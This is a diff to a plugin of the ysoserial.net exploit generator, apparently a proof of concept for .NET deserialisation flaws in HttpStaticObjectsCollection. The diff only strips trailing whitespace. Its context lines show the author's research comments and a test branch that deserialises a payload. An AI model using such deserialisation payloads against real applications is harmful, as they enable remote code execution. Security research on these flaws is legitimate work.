@@ -7,11 +7,11 @@ using ysoserial.Helpers;
 
 /**
  * Author: Soroush Dalili (@irsdl)
- * 
- * Comments: 
+ *
+ * Comments:
  *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
- *  See `HttpStaticObjectsCollection.Deserialize(BinaryReader) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.web.httpstaticobjectscollection.deserialize and 
- *      `SessionStateItemCollection.Item[String] Property`: https://docs.microsoft.com/en-us/dotnet/api/system.web.sessionstate.sessionstateitemcollection.item 
+ *  See `HttpStaticObjectsCollection.Deserialize(BinaryReader) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.web.httpstaticobjectscollection.deserialize and
+ *      `SessionStateItemCollection.Item[String] Property`: https://docs.microsoft.com/en-us/dotnet/api/system.web.sessionstate.sessionstateitemcollection.item
  *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
  *  This PoC uses BinaryFormatter from TypeConfuseDelegate
  *  The affected modules accept input type of BinaryReader
@@ -142,7 +142,7 @@ namespace ysoserial.Plugins
                 if (test)
                 {
                     // PoC on how it works in practice
-                    try { 
+                    try {
                         MemoryStream stream = new MemoryStream((byte[]) payload);
                         BinaryReader binReader = new BinaryReader(stream);
                         System.Web.HttpStaticObjectsCollection test = System.Web.HttpStaticObjectsCollection.Deserialize(binReader);
